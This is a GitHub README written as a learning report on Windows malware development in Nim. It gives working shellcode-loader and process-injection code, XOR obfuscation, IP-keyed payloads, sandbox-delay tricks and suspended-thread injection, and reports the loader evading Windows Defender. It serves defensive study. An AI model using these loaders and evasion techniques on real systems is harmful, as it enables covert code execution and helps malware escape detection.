# Malware Development for Dummies: Learning maldev for defenders

This repository documents my first steps into malware development. Inspired by Cas van Cooten's excellent ["Maldev for Dummies" workshop](https://github.com/chvancooten/maldev-for-dummies), I explored various resources and documentation that helped me get started in this learning journey. 

This project follows the structure of Van Cooten's workshop through a series of 3 exercises, progressively building from a basic shellcode loader to implementing AV/EDR evasion techniques. I highly recommend this workshop to anyone interested in getting started with malware development.

**⚠️ Disclaimer**

> This project is purely educational and defensive in nature. The techniques presented aim to better understand attack vectors to strengthen detection and defense capabilities in cybersecurity. Malicious use of this knowledge is strictly prohibited and contrary to professional ethics.

## Table of Contents

1. [Introduction](#1-introduction)
2. [Theoretical Foundations](#2-theoretical-foundations)
3. [Exercise 1: Basic Shellcode Loader](#3-exercise-1-basic-shellcode-loader)
4. [Exercise 2: Process Injection](#4-exercise-2-process-injection)
5. [Exercise 2 Bonus: Configurable Process Injection](#5-exercise-2-bonus-configurable-process-injection)
6. [Exercise 3: Evasion Techniques](#6-exercise-3-evasion-techniques)
7. [Conclusion](#7-conclusion)
8. [Acknowledgments](#8-acknowledgments)
9. [References](#9-references)
10. [Exercise Solutions](#10-exercise-solutions)

## 1. Introduction 

### 1.1 Context and Motivation

Often overlooked or even despised, malware development is actually an essential area of study for improving defensive operations. Practicing malware development allows us to learn more about how malware works and what evasion techniques they use, ultimately improving our ability to detect and neutralize them.

Another goal here is to gain a better understanding of the Windows operating system through the use of API functions. Getting closer to the low-level and interacting directly with hardware helps understand how Windows, through its kernel, communicates with hardware components.

This project follows a progressive learning approach, starting from a simple solution and gradually adding more complex features through exercises. The goal is not to create sophisticated malware, but to understand the fundamental mechanisms that govern malicious code execution on Windows.

### 1.2 Report Structure

The report is organized into three main parts that reflect the natural progression of the project:

1. **Exercise 1**: Building a shellcode loader that executes code in the current process
2. **Exercise 2**: Developing an injector capable of targeting remote processes
3. **Exercise 3**: Integrating AV and EDR evasion techniques

### 1.3 Technical Environment

**Hardware and Software:**

- **Operating System**: Windows 11 (VM)
- **Programming Language**: Nim with the `winim` library
- **Shellcode Generation**: msfvenom (Metasploit Framework)
- **Development Environment**: Visual Studio Code

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/105a14c1-1d3b-45a5-bde4-c2bfaf4894ad" />

## 2. Theoretical Foundations

Before diving in headfirst, it's important to take a moment to understand the components at play. There are two fundamental elements to distinguish:

1. **The Shellcode**: This is the malicious payload - the machine code that will be executed on the target machine. This shellcode contains the instructions we want to execute (reverse shell, data exfiltration, etc.). It's generally generated by tools like `msfvenom`.

2. **The Loader**: This is the program responsible for loading and executing the shellcode in memory. Its role is to bypass detection mechanisms (EDR, antivirus) and inject the shellcode into a target process. This is what we'll be developing in this project.

In summary, the shellcode is *what* we want to execute, while the loader is *how* we're going to execute it.

### 2.1 Generating Shellcode with msfvenom

`Msfvenom` is the reference tool for generating shellcode. It's part of the `Metasploit` framework and comes pre-installed on `Kali Linux` distributions. `Msfvenom` allows creating shellcodes for various architectures, programming languages, and malicious objectives.

**Basic Example:**
```bash
msfvenom -p windows/x64/messagebox TEXT="Are you being hacked?" TITLE="Are you tho?" ICON=QUESTION -f nimlang
```

**Breakdown:**

- `-p`: Payload (here, displaying a MessageBox on Windows x64)
- `TEXT/TITLE/ICON`: Payload parameters
- `-f nimlang`: Output format compatible with Nim

A particularly useful command that I struggled to find in the documentation allows listing all available options for a specific payload:

**List payload options:**
```bash
msfvenom -p windows/x64/messagebox --list-options
```

For this project, I primarily used the `windows/x64/messagebox` payload for simplicity and visual verification (the messagebox appears, confirming execution).

<img width="998" height="568" alt="image" src="https://github.com/user-attachments/assets/1d15879d-3fea-4699-903d-cdf32c2eb19b" />

### 2.2 Loaders and In-Memory Execution

A loader is a program that loads shellcode into RAM memory and executes it. Two main approaches are available:

1. **Current Process Execution**: The shellcode executes in the loader's own process
2. **Process Injection**: The shellcode is injected into an existing remote process

### 2.3 Windows API Architecture

Understanding the Windows API hierarchy is essential for malware development.

<img width="641" height="647" alt="image" src="https://github.com/user-attachments/assets/f05ef49e-c5f6-411a-a1d1-96b20d8d2849" />

Thanks to the `winim` module, our loader can directly use Win32 API functions. These are very well documented and therefore quite accessible to implement. However, their use leaves easily identifiable traces in an executable file, which is an immediate red flag for antivirus and EDR solutions.

It's possible to bypass this limitation by directly using the Native API (also called `syscalls`). Win32 functions are actually just wrappers around these native functions, located at a lower level in the operating system (see diagram). Direct use of the Native API is less easily detectable by EDR solutions.

However, these native functions are much more complex to implement - they're poorly documented and require a deep understanding of Windows' low-level operation. Despite their advantages in terms of evasion, Native API functions are beyond the scope of this initial project, but represent an interesting avenue for future exploration.

For this project, I chose to use the Win32 API for reasons of simplicity, accessible documentation, and available time.

## 3. Exercise 1: Basic Shellcode Loader

### 3.1 Objective

**Goal:**

- Use `msfvenom` to generate a shellcode
- Create a loader that executes this shellcode in the current process

**Bonus:**

- Modify the loader to execute shellcode without calling `CreateThread()`

To solve this first exercise, two approaches are available:

1. **Approach 1:** Allocate memory space in the current process, write our shellcode to it, and create a thread to execute it
2. **Approach 2:** Use the memory space already allocated for the variable containing our shellcode and make it executable. Once done, we can create a thread to execute it

<img width="1011" height="564" alt="image" src="https://github.com/user-attachments/assets/5925f355-ecf0-4201-96c3-d67a13795065" />

### 3.2 Approach 1: `VirtualAlloc` + `CopyMem` + `CreateThread`

**Step 1: Memory Allocation**
```nim
# Using a pointer that will hold the memory address returned by VirtualAlloc()
let rPtr = VirtualAlloc(
    nil,                               # Let Windows pick address
    cast[SIZE_T](shellcode.len),       # Size of memory space
    MEM_COMMIT,                        # Allocate and commit memory space
    PAGE_EXECUTE_READWRITE             # Memory space with RWX permissions
    )
```

**Step 2: Copy the Shellcode**
```nim
# Writing shellcode in newly allocated memory space
copyMem(rPtr, addr(shellcode), shellcode.len)
```

**Step 3: Create a Thread to Execute It**
```nim
# Create thread to execute the shellcode
let thread = CreateThread(
	nil, 
	0, 
	cast[LPTHREAD_START_ROUTINE](rPtr), # Memory address where shellcode is written
	nil, 
	0, 
	nil
	 )
```

**Complete Code**: [loader_VirtualAlloc.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/loader_VirtualAlloc.nim)

**Results:**

- ✅ Shellcode executes correctly
- ✅ MessageBox appears with the defined text
- ✅ Process terminates cleanly after closing the MessageBox

<img width="1284" height="557" alt="image" src="https://github.com/user-attachments/assets/15c10b31-6a7b-4201-9c03-2920901ee671" />

### 3.3 Approach 2: `VirtualProtect` + `CreateThread`

**Step 1: Use `VirtualProtect` to modify memory permissions and make the shellcode executable**
```nim
var oldProtect: DWORD  # Variable that will store old protection of memory address

# Using VirtualProtect to make memory address of shellcode variable executable
let success = VirtualProtect(
	addr(shellcode),             # Memory address of shellcode variable
	shellcode.len,               # Size of memory space
	PAGE_EXECUTE_READ,           # Change to RX protection
	addr(oldProtect)             # Storing old protection 
	)
```

**Step 2: Create a Thread to Execute It**
```nim
# Here we are using directly address of shellcode variable to execute payload
let thread = CreateThread(
	nil, 
	0, 
	cast[LPTHREAD_START_ROUTINE](addr(shellcode)), 
	nil, 
	0, 
	nil
	 )
```

**Complete Code**: [loader_VirtualProtect.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/loader_VirtualProtect.nim)

**Results:**

- ✅ Shellcode executes correctly
- ✅ MessageBox appears with the defined text
- ✅ Process terminates cleanly after closing the MessageBox

<img width="1003" height="539" alt="image" src="https://github.com/user-attachments/assets/c9e071c4-b0ef-4b88-a950-6156c8b2ab6c" />

### 3.4 Bonus Exercise: Execution Without `CreateThread`

`CreateThread()` is a huge red flag for AV/EDR. This function is systematically detected because it's used by the majority of malware to execute injected code.

One solution is to trick the compiler into thinking the memory area occupied by our shellcode is actually a function. We can then simply call this function to execute the payload.

This is called **Pointer Casting**:
1. The shellcode is contained in a variable (memory area with `RW` permissions by default)
2. We change the permissions of this area to `RX` (or `RWX`) with `VirtualProtect()`
3. We cast (convert the type) the pointer to this area to a function type
4. We call the function, which executes the shellcode

**Pointer Casting:**
```nim
# Cast the pointer to a function type
let fShellcode = cast[proc(){.nimcall.}](addr(shellcode))

# Execute the shellcode
fShellcode()
```

**Complete Code**: [no_CreateThread.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/no_CreateThread.nim)

<img width="1000" height="529" alt="image" src="https://github.com/user-attachments/assets/bae89ccf-cfe5-43fd-8928-0d58b980e46a" />

### 3.5 Challenges and Learnings

Not having a developer background and coming from experience primarily in `Python`, a language with enormous abstraction, this exercise had the effect of a real revelation in discovering all the hidden complexity behind program execution. Before diving into the code, I spent considerable time exploring blogs, videos, and discussions to understand fundamental concepts: what is shellcode, why machine code, the role of a loader, how the Win32 API works. Despite this theoretical preparation, being faced with a blank page in `Visual Studio Code` remained intimidating. I chose to experiment my own way rather than directly copy examples, even if it produced less elegant code. This approach allowed me to really absorb the mechanisms at play: manual memory management, permissions, handles, using return values, memory addressing, and pointers.

This first exercise, though basic, laid the essential foundations of the project. I became aware of the enormous level of abstraction we benefit from in modern languages and everything that happens behind the scenes during the execution of a simple program. The initial frustration gradually gave way to a deeper understanding of Windows' internal operation.

## 4. Exercise 2: Process Injection

### 4.1 Objective

**Goal:**

- Create a new project that injects shellcode into a remote process (e.g., `explorer.exe`)

**Implementing Process Injection:**

Process injection is a technique that allows executing malicious code in the context of an existing process rather than in our own executable. Unlike the previous exercise where the shellcode executed directly in the process generated by our `.exe`, the goal here is to inject this shellcode into a remote process already running (or that we launch ourselves).

However, the principle remains similar and follows the pattern from exercise 1:

1. Allocate memory in the remote process
2. Write the shellcode to memory
3. Execute the shellcode in the remote process

To perform this injection, we must first obtain a handle to the target process. A handle is a form of object identification (file, thread, process, etc.) that allows performing actions on that object. If no appropriate process is running, we can create one ourselves. Once we have the handle to the remote process, injection involves following the same methodology described previously: memory allocation, shellcode writing, and creating an execution thread.

This technique presents several advantages for an attacker, primarily executing the payload in the context of a legitimate process, which complicates its detection.

### 4.2 Injection Workflow

Process injection occurs in 5 steps, each requiring a specific API call:

**Step 1: Obtain a Handle on the Remote Process (example with `explorer.exe`)**
```nim
# Getting a handle on existing process (function returns handle)
let hProcess = OpenProcess(
	PROCESS_ALL_ACCESS,
	False,
	10088          # PID of explorer.exe found in Task Manager
)        
```

**Step 2: Allocate Memory in the Remote Process**
```nim
# Memory allocation in remote process (function returns pointer)
let rPtr = VirtualAllocEx(
	hProcess,                # Remote process handle
	nil,
	cast[SIZE_T](shellcode.len),
	MEM_COMMIT,
	PAGE_EXECUTE_READWRITE
)
```

**Step 3: Write the Shellcode to Allocated Memory**
```nim
# Write shellcode in newly allocated memory space (function returns a boolean)
let is_Success = WriteProcessMemory(               
	hProcess,
	rPtr,
	addr(shellcode),
	cast[SIZE_T](shellcode.len),
	nil
)
```

**Step 4: Execute the Shellcode in the Remote Process**
```nim
# Shellcode execution in remote process
let hThread = CreateRemoteThread(
	hProcess,     
	nil,
	0,
	cast[LPTHREAD_START_ROUTINE](rPtr),
	nil,
	0,
	nil
)
```

**Step 5: Close the Handle (cleanup)**
```nim
# Closing remote process handle when done for clean up
CloseHandle(hProcess)
```

**Demonstration: Injection into `explorer.exe`**

**Step 1: Identifying the Target Process**

Before injection, we retrieve the PID of the explorer.exe process via Windows Task Manager.

<img width="1286" height="487" alt="image" src="https://github.com/user-attachments/assets/d75201a4-bbc2-4c7a-bcb9-54cc2f73edc0" />

**Step 2: Execution and Injection**

After compiling the loader, we execute the program. The shellcode is successfully injected.

<img width="1715" height="689" alt="image" src="https://github.com/user-attachments/assets/530926fb-dd90-4a88-9328-a3edd3024964" />

✅ The MessageBox appears in the context of `explorer.exe`.

By analyzing `explorer.exe` in `Task Manager`, we can observe that a new thread, with the name of our executable, has been created by our loader.

**Complete Code**: [process_injection.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice2/process_injection.nim)

### 4.3 Challenges and Learnings

This exercise proved more accessible than expected. The functions needed for process injection are actually very similar to those used for local execution, with the difference being that we now need to specify the handle of the remote process into which we're injecting code. This similarity allowed me to approach the exercise with more confidence and successfully implement the solution independently. I'm starting to better understand the logic of Win32 API functions: how to handle return data, required parameters, handles, etc.

## 5. Exercise 2 Bonus: Configurable Process Injection

### 5.1 Objective

**Goals:**

- Make the target process configurable
- If the process doesn't exist, create it

**Implementation:**

The goal of this exercise is to start from the previous program and add the ability (via user input) to specify the target process rather than hardcoding its PID. This improvement makes the solution much more modular, given that a process's PID changes with each new instance, which made the previous approach inflexible.

Our program must be capable of performing the following tasks:

1. Take a process name as input
2. Check if this process is already running
3. If yes, retrieve its PID. Otherwise, start it and retrieve its PID
4. Inject the shellcode into the identified process

I had a lot of difficulty completing this exercise. I relied heavily on code examples provided in Cas van Cooten's GitHub repo, which I then adapted to the exercise.

### 5.2 Implementing Process Detection

The starting point of my solution is based on two functions found in a code example shared in the GitHub repository.

**Function `GetLsassPid()`**

This function retrieves the PID of a specific process (here `lsass.exe`) if it's running.
```nim
proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)
```

**Step 1: Create a Snapshot of Running Processes**
```nim
hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
```

This line creates a snapshot of running processes.

**Step 2: Iterate Through the Snapshot**
```nim
if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
        if entry.szExeFile.toString == "lsass.exe":
            return int(entry.th32ProcessID)
```

The code then iterates through each entry in the snapshot using a loop. For each process, we compare its name with `lsass.exe` and return its PID if a match is found.

The `toString()` function, called in `GetLsassPid()`, converts the process name from the `WCHAR` type (Windows-specific) to a standard Nim string.
```nim
proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))
```

#### **Adapting to Our Context:**

After adapting the provided example, I developed two functions to handle detection and PID retrieval for the target process.

**Function 1: Checking Process Existence**
```nim
# Checking if specified process is running or not
proc is_Running(process: string): bool =
    var
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        if entry.szExeFile.toString == process:
            return true
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process:
                return true
    return false
```

Unlike the initial example that specifically targeted `lsass.exe`, this function takes the user-provided process name as a parameter. It creates a snapshot of active processes and iterates through each entry to check if there's a match with the specified name. The function returns true if the process is found, false otherwise.

**Function 2: PID Retrieval**
```nim
# Getting PID of specified process 
proc getPid(process: string): DWORD =
    var
        entry: PROCESSENTRY32
        hSnapshot: HANDLE
        
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        if entry.szExeFile.toString == process:
            return entry.th32ProcessID
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process:
                return entry.th32ProcessID
```

This function follows the same logic as `is_Running()`, but returns the process PID instead of a boolean. This PID is necessary to obtain a handle on the process and inject shellcode into it.

I'm aware that these two functions share a lot of similar code. Ideally, they could be merged into a single more generic function, but I haven't found a better way to structure the code. This approach works correctly despite the redundancy.

With the addition of these functions, I also restructured the rest of the code by encapsulating different steps into dedicated functions (`Injection()`, `main()`), making the program more readable:
```nim
when isMainModule:

    # User input for target process
    echo "Enter process to inject shellcode in:" 
    let processName = readLine(stdin)
    
    # Looking if process is already running, if not spawn it with winExec()
    if not is_running(processName):
        echo "Process not running...Launching process: ", processName
        WinExec(processName, SW_HIDE)
        sleep(1000)
        echo "Process ", processName, " now running..."

    # Process now running so we can get PID
    echo "Looking for process ID..."
    let processID= getPid(processName)
    echo "Process ID: ", processID

    # Inject shellcode into remote process
    echo "Process injection..."
    let is_success = injection(processID)
    
    # Validation
    if not is_success:
        echo "injection failed"
    else:
        echo "injection successful"
```

The program asks the user to specify the target process name. If this process isn't running, the Windows API function `WinExec()` starts it. The `SW_HIDE` parameter allows launching the process in the background without opening a visible window. A one-second delay (`sleep(1000)`) ensures the process has time to start before we attempt to retrieve its PID. Once the PID is obtained, injection can be performed via the `Injection()` function.

**Complete Code**: [dynamic_process_injection.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice2/dynamic_process_injection.nim)

### 5.3 Demonstration

To illustrate the loader's functionality with target process selection, I performed a demonstration with `mspaint.exe`, a process that presents stable behavior during injection.

**Step 1: Initial State**

Before executing the malware, we verify that `mspaint.exe` is not running in Task Manager.

<img width="736" height="714" alt="image" src="https://github.com/user-attachments/assets/23a23587-90d9-4a4f-8304-4e66bb3e02ee" />

**Step 2: Loader Execution**

The malware is launched in console and asks the user to specify the target process. We enter `mspaint.exe` as the process to inject shellcode into.

<img width="1770" height="729" alt="image" src="https://github.com/user-attachments/assets/27d8ee47-195e-4190-87d3-6d84f474a60e" />

**Step 3: Injection Result**

After injection, we observe in Task Manager that:

- `mspaint.exe` is now running
- The displayed PID corresponds exactly to the PID retrieved by our loader during injection
- The shellcode was successfully injected into the process

<img width="1744" height="709" alt="image" src="https://github.com/user-attachments/assets/dc3e02d3-ec92-4849-aa59-91e3768bf3dc" />

### 5.4 Challenges and Learnings

This bonus exercise represents a considerable jump in difficulty compared to exercise 2. Where previous exercises were relatively accessible once basic concepts were understood, this one required much more time and external help. The complexity exists at several levels.

First, the very logic of process detection and launching was very difficult to understand. Using functions like `Process32First()` and `Process32Next()`, the snapshot system, and the need to convert process names make the entire implementation really complex and unintuitive.

Ultimately, my solution works reliably only with a few specific processes (`mspaint.exe`, `cmd.exe`...), with fairly unpredictable behaviors for applications like `notepad.exe` or `calc.exe`. Another question that comes to mind concerns the relevance of user input in an injection context. It's possible I don't yet grasp the full interest of this approach.

Despite these difficulties and limitations, this exercise was extremely educational and, I must admit, really captivating.

## 6. Exercise 3: Evasion Techniques

### 6.1 Objective

**Goal:**

- Implement one or more evasion techniques and test against antivirus
- Implement one or more EDR evasion techniques (test against EDR if possible)

This exercise is divided into two complementary parts:

1. **AV Evasion**: techniques to bypass antivirus
2. **EDR Evasion**: techniques to bypass detection and response solutions

### 6.2 AV Evasion: Shellcode Obfuscation

I chose to implement a shellcode obfuscation technique based on XOR encryption. This approach presents several significant advantages for antivirus evasion:

- The XOR operation is fast and lightweight to execute
- The same function can serve for both encryption and decryption
- The encrypted shellcode no longer contains patterns recognized by antivirus

Antivirus solutions detect shellcodes by searching for known byte sequences (signatures). By encrypting the shellcode, we make these signatures unrecognizable. The shellcode will only be decrypted at execution time, directly in memory, thus avoiding any static detection.

**XOR Encryption/Decryption Function**

The basic function performs an XOR operation between each byte of the shellcode and an encryption key:
```nim
# function to encrypt shellcode using XOR
proc xorEncrypt(shellcode: var array[321, byte], key: byte) =
    for i in 0..<shellcode.len:
        shellcode[i] = shellcode[i] xor key
```

**In-Memory Decryption Function**

Unlike the previous function that operates on a local variable, this function decrypts the shellcode directly in the remote process's memory space. This approach presents important advantages for evasion.

The shellcode remains encrypted on disk. It's only decrypted once in place, just before execution. However, this approach requires writing additional code and involves using an additional Windows API function (`ReadProcessMemory()`) to retrieve the encrypted shellcode from memory before decrypting it.
```nim
# function decrypts shellcode in memory + writes back result in memory
proc xorDecryptInMemory(hProcess: HANDLE, rPtr: LPVOID, key: byte) =
    
    var shellcode: array[321, byte] 
   
	let is_Read = ReadProcessMemory(
	    hProcess,                                         
		rPtr,
		addr(shellcode),
		cast[SIZE_T](shellcode.len),
		nil
		)

    # Validation
    if is_Read == False:
        echo "Reading memory failed..."
        return

    # Using xorEncrypt to decrypt (XOR is symmetric)
    xorEncrypt(shellcode, key)

    # Overwrite result in same memory space
    let is_Written = WriteProcessMemory(
	    hProcess,
		rPtr,
	    addr(shellcode),
	    cast[SIZE_T](shellcode.len),
	    nil
	    )
```

This function performs three operations:

1. Read: retrieves the encrypted shellcode from the remote process's memory (`ReadProcessMemory`)
2. Decryption: applies XOR with the key to obtain the original shellcode
3. Rewrite: overwrites the encrypted shellcode with its decrypted version at the same location (`WriteProcessMemory`)

Then, the decryption function is called directly in the `Injection()` function, right after writing the encrypted shellcode to memory. I haven't found a better solution than integrating it directly into the function.
```nim
# function for remote process injection of selected process
proc Injection(processID: DWORD, key: byte): bool =
	.
	.
	.
	    
	# Write shellcode in newly allocated memory space (function returns a boolean)
	let is_Success = WriteProcessMemory(               
		hProcess,
		rPtr,
		addr(shellcode),
		cast[SIZE_T](shellcode.len),
		nil
	)

    # validation
    if is_Success == False:
        echo "writing to memory failed"
    else:
        echo "writing to memory successful"

    # Apply encryption to shellcode
    echo "Decrypting shellcode in memory..."
    xorDecryptInMemory(hProcess, rPtr, key)
    echo "Shellcode decrypted"
	.
	.
	.
```

In the main function, the shellcode is first encrypted with a key, then the injection process is launched. The shellcode remains encrypted until its in-memory decryption just before execution.
```nim
when isMainModule: 

    # Encrypt shellcode using XOR with key
    let key: byte = 0xAA 
    xorEncrypt(shellcode, key)
    echo "Shellcode encrypted..."

    # user input for target process
    echo "Enter process to inject shellcode in:"
    let processName = readLine(stdin)
    .
    .
    .
    # Inject shellcode in remote process
    echo "Process injection..."
    let is_success = Injection(processID, key)

    # Validation
    if not is_success:
        echo "injection failed"
    else:
        echo "injection successful"
```

The rest of the program remains unchanged from previous exercises.

**Complete Code**: [AV_EVASION.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice3/AV_EVASION.nim)

### VirusTotal Test

To evaluate XOR encryption's effectiveness, I compared two program versions on VirusTotal:

**Without AV evasion technique** ([dynamic_process_injection.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice2/dynamic_process_injection.nim)):

- Detection score: **21/71**
- 21 antivirus solutions identify the file as malicious

<img width="1333" height="215" alt="image" src="https://github.com/user-attachments/assets/d2ad918d-976f-4b0f-a66c-726176fd49cc" />

**With XOR shellcode encryption** ([AV_EVASION.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice3/AV_EVASION.nim)):

- Detection score: **18/72**
- Reduction of 3 detections

<img width="1394" height="210" alt="image" src="https://github.com/user-attachments/assets/3b94d279-3771-4315-8359-2ae20d2fc11f" />

The impact of XOR encryption alone remains modest but measurable. This demonstrates that the technique works, but in a limited way. This result is consistent with expectations. Implementing a single obfuscation technique cannot compete with the multiple detection layers of modern antivirus solutions. To achieve a significant evasion rate, multiple complementary techniques would need to be combined:

- String obfuscation
- Win API call obfuscation
- Using Native API instead of Win32

Nevertheless, these results confirm that even a simple and quick-to-implement technique can reduce the detection rate.

### Windows Defender Test

To complement the VirusTotal evaluation, I performed a test in real conditions on a Windows machine with Windows Defender enabled.

**Test Environment**:

- Windows 10 VM (workstation)
- Windows Defender enabled

<img width="1741" height="947" alt="image" src="https://github.com/user-attachments/assets/36a1697a-3fca-47ba-aa48-5468d6c8b435" />

**Test Protocol**:

1. Transfer the executable from development machine to test VM desktop
2. Attempt to execute the program

**Results**:

**File Transfer**: The executable file could be copied to the VM desktop without any alert from Windows Defender.

<img width="1581" height="965" alt="image" src="https://github.com/user-attachments/assets/a6a8c368-2f00-4974-833a-f334e4202b00" />

**Execution**: The program executed without triggering any alert or block from Windows Defender. The shellcode was successfully injected into the target process.

<img width="1882" height="995" alt="image" src="https://github.com/user-attachments/assets/00cd2d06-19db-438c-825d-11ff5250f30b" />

**Conclusion**:

While these results seem positive, it's difficult to attribute this success solely to the implemented XOR encryption technique. Several factors may explain the lack of detection:

1. **Shellcode nature**: I used a relatively benign shellcode (`messagebox`) rather than a truly malicious payload (reverse shell, Meterpreter)
2. **Test limitations**: A single test on a single configuration doesn't constitute statistically significant validation
3. **Defender behavior**: Windows Defender may not systematically analyze all executables, especially those from local transfer

For more rigorous testing, it would require:

- Testing with truly malicious payloads
- Multiplying tests on different Windows Defender versions
- Explicitly comparing a version without encryption vs. with encryption on the same environment

### 6.3 EDR Evasion

To bypass EDR solutions that analyze program behavior, I implemented a combination of three complementary techniques:

1. **Payload Keying**: target environment verification before execution
2. **Logic Bypass**: timing techniques to escape sandboxes
3. **Suspended Thread Injection**: injection into a suspended thread to reduce detection

These techniques are relatively simple to implement and don't require major code modifications. However, their real effectiveness against modern EDRs remains to be validated. A test will be performed below with Wazuh to concretely evaluate their impact.

### Payload Keying

Payload keying consists of conditioning shellcode execution on the presence of a specific element of the target environment. In this implementation, I verify that the machine's IP address matches that of the targeted victim:
```nim
# Payload keying to make sure that payload is executed on target machine

# function to get environment IP and check it against target's IP
proc executeIfTargetIP(): bool =
    let targetIP = "10.34.10.41" # target IP where shellcode should execute
    let currentIP = $getPrimaryIPAddr()

    if currentIP != targetIP:
        echo "IP address not matching...abort mission"
        return false

    echo "IP address matching..."
    return true
```

**Utility Against EDR**:

This technique is particularly effective against automated analysis environments (sandboxes, EDR test VMs). The shellcode will only execute on the targeted machine with the specific IP `10.34.10.41`. If an analyst or EDR attempts to execute the program in a test environment with a different IP, the malware will immediately stop without revealing its malicious behavior.

### Logic Bypass

Logic bypass aims to waste time for dynamic analysis solutions by performing useless calculations combined with time delays (`sleep()`):
```nim
# logic bypass - random calculations to buy time during dynamic/static analysis

proc uselessCalc(): int =
    var result: int
    for i in 1..1000000:
        result += i - 100*(i div (i+8)) + ((i*3) mod 54) 
    sleep(3000)
    
    echo "done doing dummy tasks..."
    
    return result
```

**Utility Against EDR**:

Many EDR sandboxes have limited timeouts (generally 30 to 60 seconds) to analyze a program. By adding artificial delays, we force the sandbox to wait, which can cause two scenarios favorable to the attacker:

1. If analysis exceeds the allotted time, the program is released without being fully analyzed
2. A program that performs calculations and waits before acting can resemble a legitimate program during initialization

### Suspended Thread Injection

Instead of creating a thread directly in active mode, this technique consists of creating the thread in a **suspended** state (`CREATE_SUSPENDED`), performing some operations, then resuming it (`ResumeThread`) to execute the shellcode:
```nim
# function for remote process injection of selected process (suspended)
proc susInjection(processID: DWORD, key: byte): bool =

	.
	.
	.
  
    let hThread = CreateRemoteThread(
	    hProcess,     
		nil,
		0,
		cast[LPTHREAD_START_ROUTINE](rPtr),
		nil,
		CREATE_SUSPENDED,                   # Create thread in suspended state
		nil
		)      

    # validation                            
    if hThread == cast[HANDLE](nil):
        echo "threading failed"
    else:
        echo "Suspended threading success"

    # perform some useless calc before executing thread
    let dummy = uselessCalc()  

    # resume thread and execute shellcode
    echo "Thread resumed and shellcode execution..."
    ResumeThread(hThread)
    
    .
    .
    .
```

**Utility Against EDR**:

This technique presents several advantages for evasion:

1. Creating a suspended thread generates less immediate suspicious activity than a directly active thread
2. Some EDRs don't monitor suspended threads as intensively, as they don't yet represent an active threat
3. By introducing a delay (via `uselessCalc()`) between thread creation and resumption, we temporally decouple injection from execution, which can deceive EDR behavioral correlations

**Complete Code**: [EDR_EVASION.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice3/EDR_EVASION.nim)

### Test on Windows Machine with Wazuh Agent

I attempted to evaluate EDR evasion techniques' effectiveness by executing the malware on a Windows VM equipped with a Wazuh agent connected to a homelab. The goal was to observe if the implemented techniques (payload keying, logic bypass, suspended thread injection) allowed reducing or avoiding alert generation.

Unfortunately, I didn't identify specific alerts related to process injection in the Wazuh dashboard, which makes the test inconclusive. Due to lack of time, I couldn't deepen this investigation.

## 7. Conclusion

This malware development project constituted a real learning challenge. Starting from limited knowledge in low-level programming, I progressively developed a shellcode loader, a functional process injector, and implemented several AV/EDR evasion techniques. Beyond technical aspects, this project allowed me to acquire a deep understanding of Windows architecture and its internal mechanisms.

Malware development, though complex and sometimes frustrating, proved extremely educational. It forces descending several abstraction levels and truly understanding an operating system's functioning.

## 8. Acknowledgments

Big thanks to Cas van Cooten for creating and sharing the ["Maldev for Dummies" workshop](https://github.com/chvancooten/maldev-for-dummies). This project wouldn't have been possible without this excellent resource. I highly encourage anyone interested in malware development to check out his work.

## 9. References

### Official Documentation

- **Microsoft Learn** - Windows API Index  
    https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list

- **Metasploit Framework** - Official Documentation  
    https://www.metasploit.com/

### Blogs and Technical Articles

- **Van Cooten, C.** - Maldev for Dummies (GitHub Repository)  
	https://github.com/chvancooten/maldev-for-dummies

- **SentinelOne** - "Malicious Input: How Hackers Use Shellcode"  
    https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/

- **Hackers-Arise** - "Metasploit Basics Part 9: Using Msfvenom to Create Custom Payloads"  
    https://hackers-arise.com/metasploit-basics-part-9-using-msfvenom-to-create-custom-payloads/

- **Mr. Malman (Medium)** - "Building Your First Malware Payload with Nim"  
    https://mr-malman.medium.com/building-your-first-malware-payload-with-nim-0300d5dd9151

- **Edgar Huemac (Medium)** - "Malware Development with Nim: Introduction"  
    https://medium.com/@edgarhuemac/malware-development-with-nim-introduction-bd11c49191e8

## 10. Exercise Solutions

### 10.1 Exercise 1

- [loader_VirtualAlloc.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/loader_VirtualAlloc.nim)
- [loader_VirtualProtect.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/loader_VirtualProtect.nim)
